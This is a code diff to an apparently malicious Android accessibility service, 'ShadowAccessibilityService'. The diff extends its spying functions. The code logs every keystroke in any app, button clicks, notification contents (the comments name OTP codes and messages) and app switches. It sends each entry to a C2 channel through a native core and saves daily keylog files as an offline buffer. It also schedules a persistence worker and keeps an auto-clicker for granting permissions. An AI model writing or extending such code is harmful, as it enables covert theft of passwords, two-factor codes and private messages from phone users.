@@ -6,20 +6,23 @@ import android.content.Context
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import java.io.File
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class ShadowAccessibilityService : AccessibilityService() {
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         Log.i("ShadowA11y", "Accessibility Service Connected")
-        
-        // Guarantee persistence is scheduled if service is toggled on manually
+
         try {
             com.shadow.ShadowWorker.enqueue(applicationContext)
         } catch (e: Exception) {
             Log.e("ShadowA11y", "Failed to enqueue worker", e)
         }
-        
+
         val info = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                          AccessibilityEvent.TYPE_VIEW_CLICKED or
@@ -41,37 +44,54 @@ class ShadowAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val packageName = event.packageName?.toString() ?: "unknown"
         val eventType = event.eventType
+        val timestamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
 
-        // 1. Keylogger (Text Changed)
+        var logEntry: String? = null
+
+        // 1. Keylogger (every keystroke in any text field)
         if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             val text = event.text.joinToString("")
             if (text.isNotBlank()) {
-                val logEntry = "[KEYLOG][$packageName] $text"
-                logToC2(logEntry)
+                logEntry = "[$timestamp][KEYLOG][$packageName] $text"
             }
         }
 
-        // 2. Click Monitor (Buttons, Links)
+        // 2. Click Monitor
         if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
             val text = event.text.joinToString("")
             val desc = event.contentDescription?.toString() ?: ""
-            val id = event.source?.viewIdResourceName ?: ""
-            val logEntry = "[CLICK][$packageName] Text: '$text' Desc: '$desc' ID: '$id'"
-            logToC2(logEntry)
+            logEntry = "[$timestamp][CLICK][$packageName] '$text' '$desc'"
         }
 
-        // 3. Notification Reader (OTP, Messages)
+        // 3. Notification Reader (OTP codes, incoming messages)
         if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
             val text = event.text.joinToString(" | ")
-            val logEntry = "[NOTIF][$packageName] $text"
-            logToC2(logEntry)
+            logEntry = "[$timestamp][NOTIF][$packageName] $text"
         }
 
         // 4. App Launch / Screen Change
         if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             val className = event.className?.toString() ?: ""
-            val logEntry = "[WINDOW][$packageName] $className"
-            logToC2(logEntry)
+            logEntry = "[$timestamp][WINDOW][$packageName] $className"
+        }
+
+        if (logEntry != null) {
+            // Send to C2 (live)
+            com.shadow.ShadowCore.logEvent(logEntry!!)
+            // Write to daily file (offline buffer)
+            writeToDailyFile(logEntry!!)
+        }
+    }
+
+    private fun writeToDailyFile(entry: String) {
+        try {
+            val dateStr = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
+            val dir = File(filesDir, "keylogs")
+            if (!dir.exists()) dir.mkdirs()
+            val file = File(dir, "keylog_$dateStr.txt")
+            file.appendText(entry + "\n")
+        } catch (e: Exception) {
+            Log.e("ShadowA11y", "Failed to write keylog file", e)
         }
     }
 
@@ -81,12 +101,6 @@ class ShadowAccessibilityService : AccessibilityService() {
             .edit().putBoolean("a11y_active", false).apply()
     }
 
-    private fun logToC2(entry: String) {
-        // Send directly to the Rust core via JNI
-        com.shadow.ShadowCore.logEvent(entry)
-    }
-
-    // Auto-clicker utility (e.g., granting permissions autonomously)
     fun clickNodeById(viewId: String): Boolean {
         val root = rootInActiveWindow ?: return false
         val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
